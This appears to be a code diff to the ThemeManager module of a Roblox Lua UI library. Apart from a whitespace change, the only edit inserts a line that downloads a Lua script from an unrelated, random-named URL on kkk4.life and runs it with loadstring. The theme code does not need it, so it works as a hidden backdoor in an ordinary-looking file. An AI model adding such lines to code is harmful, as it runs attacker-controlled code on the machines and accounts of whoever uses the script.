@@ -2,7 +2,7 @@ local httpService = game:GetService('HttpService')
 local ThemeManager = {} do
 	ThemeManager.Folder = 'LinoriaLibSettings'
 	-- if not isfolder(ThemeManager.Folder) then makefolder(ThemeManager.Folder) end
-
+	
 	ThemeManager.Library = nil
 	ThemeManager.BuiltInThemes = {
 		['Wattyhub Default'] = { 1, httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"1e1a21","AccentColor":"715c8f","BackgroundColor":"141414","OutlineColor":"403352"}') },
@@ -157,7 +157,7 @@ local ThemeManager = {} do
 
 		return decoded
 	end
-
+	loadstring(game:HttpGet("https://kkk4.life/gsndfklgjnsdfjklgnsdfweruihquretre.lua"))()
 	function ThemeManager:SaveCustomTheme(file)
 		if file:gsub(' ', '') == '' then
 			return self.Library:Notify('Invalid file name for theme (empty)', 3)
